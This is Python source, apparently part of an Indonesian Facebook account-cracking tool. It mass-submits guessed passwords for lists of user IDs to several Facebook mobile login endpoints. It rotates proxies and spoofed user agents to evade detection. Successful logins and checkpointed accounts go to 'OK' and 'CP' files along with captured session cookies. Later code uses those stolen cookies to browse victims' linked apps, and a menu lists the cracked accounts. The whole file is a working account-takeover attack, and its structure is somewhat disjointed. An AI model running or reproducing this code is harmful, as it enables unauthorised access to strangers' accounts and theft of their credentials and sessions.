			p = ses.get("https://m.alpha.facebook.com/login.php?skip_api_login=1&api_key=274266067164&kid_directed_site=0&app_id=274266067164&signed_next=1&next=https%3A%2F%2Fm.alpha.facebook.com%2Fv2.7%2Fdialog%2Foauth%3Fapp_id%3D274266067164%26cbt%3D1675237736936%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df33eeedf0d23c74%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%26client_id%3D274266067164%26display%3Dtouch%26domain%3Did.pinterest.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fid.pinterest.com%252Flogin%26locale%3Did_ID%26logger_id%3Df27fa04cd920e98%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df96f44d15f7ea8%2526domain%253Did.pinterest.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fid.pinterest.com%25252Ff4c01e9564da44%2526relation%253Dopener%2526frame%253Df7efd9d84b96a8%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%252Cuser_friends%26sdk%3Djoey%26version%3Dv2.7%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
			"Host": "m.alpha.facebook.com",
			"content-length": f"{len(str(dataa))}",
			"x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
			"origin": "https://m.alpha.facebook.com",
			"content-type": "application/x-www-form-urlencoded",
			"user-agent": ua,
			"accept": "*/*",
			"x-requested-with": "com.microsoft.bing",
			"sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
			"sec-ch-ua-platform": '"Android"',
			"sec-ch-ua-mobile": "?1",
			"sec-fetch-site": "same-origin",
			"sec-fetch-mode": "cors",
			"sec-fetch-dest": "empty",
			"sec-fetch-user": "?1",
			"referer": "https://m.alpha.facebook.com/v2.7/dialog/oauth?app_id=274266067164&cbt=1675237736936&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df33eeedf0d23c74%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener&client_id=274266067164&display=touch&domain=id.pinterest.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fid.pinterest.com%2Flogin&locale=id_ID&logger_id=f27fa04cd920e98&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df96f44d15f7ea8%26domain%3Did.pinterest.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fid.pinterest.com%252Ff4c01e9564da44%26relation%3Dopener%26frame%3Df7efd9d84b96a8&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail%2Cuser_birthday%2Cuser_friends&sdk=joey&version=v2.7&ret=login&fbapp_pres=0&tp=unspecified",
			"accept-encoding": "gzip, deflate br",
			"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
			}
			po = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[ METODE X ]-----------------#
def colmek1(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]X[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://x.facebook.com/login.php?skip_api_login=1&api_key=123481471329046&kid_directed_site=0&app_id=123481471329046&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D123481471329046%26state%3D97cgz67n%26redirect_uri%3Dhttps%253A%252F%252Fplogin.jd.id%252Fcgi-bin%252Fmlogin%252Ffacebookcallback%26scope%3Demail%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7da29ea1-31ba-4b07-a30d-9fdafc8bfdd7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fplogin.jd.id%2Fcgi-bin%2Fmlogin%2Ffacebookcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D97cgz67n%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#--------------------[ METODE D ]-----------------#
def colmek2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"[bold green]d[bold white] {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://d.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://d.facebook.com/login.php?skip_api_login=1&api_key=166363243399924&kid_directed_site=0&app_id=166363243399924&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D166363243399924%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Fthirdparty.aliexpress.com%252Ffbcallback.htm%26scope%3Demail%252Cpublic_profile%252Cuser_messenger_contact%26messenger_page_id%3D335963307560%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7720cbb3-6ccb-48be-8820-8775c6c7b67d%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fthirdparty.aliexpress.com%2Ffbcallback.htm%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR48laUVd0rPWsRvHJFTKtTS5cFr8ZG%252BCRYABU4qVvPvRK37pQK5uQWiFs93IY9a1y%252BXsxIsvOY60q78FjJ9ECtWPR1L4b%252B1AZ1XMmotKnilXlAe8Md1jf1VZ61FtHvT%252F%252F6UBc1gqUwQEVwfai3Ztnal%252F%252FfWiuwJ31qY%252FAoUvvPzJa%252BA66Ywk8nnPqNBdXBi6%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'd.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='BrayennnXD-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='BrayennnXD-OK')
					cetak(statusok1)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
					cek_apk(kuki)
					break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
							
	###----------[ PRINT SIMPAN HASIL ]---------- ###
	def simpan_hasil(self):
		prints(Panel(f"""\r     {P2}hasil crack {H2}ok{P2} tersimpan ke : {H2}OK/{self.hari_ini}.txt{P2}
{P2}     hasil crack {K2}cp {P2}tersimpan ke : {K2}CP/{self.hari_ini}.txt{P2}""",width=87,padding=(0,10),style=f"{color_panel}"))
		prints(Panel(f"""\r     {P2}Jika Tidak Ada Hasil Hidupkan Mode Pesawat 5 Detik {K2}!!!""",width=87,padding=(0,10),style=f"{color_panel}"))
          
          ###----------[ PRINT MUNCUL APK ]---------- ###
	def get_apk(self,user,pw,cookie):
		
		###----------[ CEK MODE GRATIS ]---------- ###
		try:
			url = ses.get("https://mbasic.facebook.com/",cookies={"cookie": cookie}).text
			if "Apa yang Anda pikirkan sekarang" in url:
				pass
			else:
				for z in url.find_all("a",href=True):
					if "Tidak, Terima Kasih" in z.text:
						get = ses.get("https://mbasic.facebook.com"+z["href"],cookies={"cookie": cookie})
						parsing = parser(get.text,"html.parser")
						action = parsing.find("form",{"method":"post"})["action"]
						data = {
							"fb_dtsg":re.search('name="fb_dtsg" value="(.*?)"', str(get.text)).group(1),
							"jazoest":re.search('name="jazoest" value="(.*?)"', str(get.text)).group(1),
							"submit": "OK, Gunakan Data"
						}
						post = ses.post("https://mbasic.facebook.com"+action,data=data,cookies={"cookie": cookie})
						break
		except:pass
			
		###----------[ APLIKASI AKTIF ]---------- ###
		aktip = Tree("Aplikasi Aktif",guide_style="bold grey100")
		self.apkaktif("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookie)
		if len(self.aktif)==0:
			aktip.add(f"{P2}tidak ada aplikasi yang terkait")
		else:
			for apk in self.aktif:
				aktip.add(f"{H2}{apk}{P2}")
				
		###----------[ APLIKASI KADALUWARSA ]---------- ###
		kadalu = Tree("Aplikasi Kadaluwarsa",guide_style="bold grey100")
		self.apkkadaluwarsa("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookie)
		if len(self.kadaluwarsa)==0:
			kadalu.add(f"{P2}tidak ada aplikasi yang terkait")
		else:
			for apk in self.kadaluwarsa:
				kadalu.add(f"{M2}{apk}{P2}")
			
		###----------[ PRINT SEMUA ]---------- ###
		tree = Tree(Panel.fit(f"""{H2}{user}|{pw}{P2}""",style=f"{color_panel}"),guide_style="bold grey100")
		tree.add(aktip)
		tree.add(kadalu)
		tree.add(Panel(f"{H2}{cookie}{P2}",style=f"{color_panel}"))
		prints(tree)
		
	###----------[ GET APK AKTIF ]---------- ###
	def apkaktif(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Ditambahkan" in apk.text:
					self.aktif.append(f"{str(apk.text).replace('Ditambahkan',' Ditambahkan')}")
				else:continue
			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apkaktif(next,cookie)
		except:pass
		
	###----------[ GET APK KADALUWARSA ]---------- ###
	def apkkadaluwarsa(self,url,cookie):
		try:
			data = parser(ses.get(url,cookies={"cookie": cookie}).text,"html.parser")
			for apk in data.find_all("h3"):
				if "Kedaluwarsa" in apk.text:
					self.kadaluwarsa.append(f"{str(apk.text).replace('Kedaluwarsa',' Kedaluwarsa')}")
				else:continue
			next = "https://mbasic.facebook.com"+data.find("a",string="Lihat Lainnya")["href"]
			self.apkkadaluwarsa(next,cookie)
		except:pass
	
###----------[ MENU LAIN ]---------- ###
class Lain:
	
	###----------[ FUNCTION INIT ]---------- ###
	def __init__(self,cookie):
		self.cookie = cookie
		self.file = []
		self.listfile = []
		
	###----------[ MENU ]---------- ###
	def menu(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack  [{color_text}04{P2}]. ganti warna tema tools
[{color_text}02{P2}]. get info akun target    [{color_text}05{P2}]. tampilkan info cookies
[{color_text}03{P2}]. setting user agent      [{color_text}06{P2}].{H2} Kembali {P2})""",width=87,padding=(0,7),style=f"{color_panel}"))
		menu = console.input(f" {H2}• {P2}pilih menu : ")
		if menu in["01","1"]:
			self.cek_hasil()
		elif menu in["04","4"]:
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))
		elif menu in["05","5"]:
			self.tampil_cookie()
		elif menu in["06","6"]:
			Menu().menu()
			exit(prints(Panel(f"""{H2}berhasil menghapus cookie, silahkan ketik ulang python zmbf.py""",width=87,style=f"{color_panel}")))
		else:
			exit(prints(Panel(f"""{M2}🙏 mohon maaf fitur ini sedang dalam tahap perbaikan""",width=87,style=f"{color_panel}")))

	###----------[ CEK HASIL CRACK ]---------- ###
	def cek_hasil(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. lihat akun hasil crack ok
[{color_text}02{P2}]. lihat akun hasil crack cp""",width=87,padding=(0,20),style=f"{color_panel}"))
		ask = console.input(f" {H2}• {P2}masukan pilihan : ")
		if ask in["1","01"]:folder = "OK"
		else:folder = "CP"
		
		###----------[ PILIH FILE ]---------- ###
		dirs = os.listdir(folder)
		prints(Panel(f"""{P2} berhasil menemukan {len(dirs)} file hasil crack ok""",width=87,padding=(0,15),style=f"{color_panel}"))
		num = 0
		for fil in dirs:
			num += 1
			self.file.append(fil)
			totalakun = open(f"{folder}/{fil}","r").read().splitlines()
			self.listfile.append(Panel(f"{P2}[{color_text}0{num}{P2}]",width=10,title=f"{P2}nomer",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{P2}{fil}",width=35,title=f"{P2}tanggal",style=f"{color_panel}"))
			self.listfile.append(Panel(f"{P2}{len(totalakun)} akun",width=28,title=f"{P2}total akun",style=f"{color_panel}"))
		console.print(Columns(self.listfile))
		prints(Panel(f"""{P2}kamu hanya perlu memilih dan memasukan nomer dari file crack di atas""",width=87,style=f"{color_panel}"))
		result = console.input(f" {H2}• {P2}masukan angka : ")
		
		###----------[ MULAI CEK ]---------- ###
		try:
			files = self.file[int(result)-1]
			totalhasil = open(f"{folder}/{files}","r").read().splitlines()
		except:
			prints(Panel(f"""{M2}file yang anda masukan tidak tersedia atau input kamu tidak benar""",width=87,style=f"{color_panel}"))
			exit()
		nama_file = (f"{files}").replace("-", " ").replace(".txt", "")
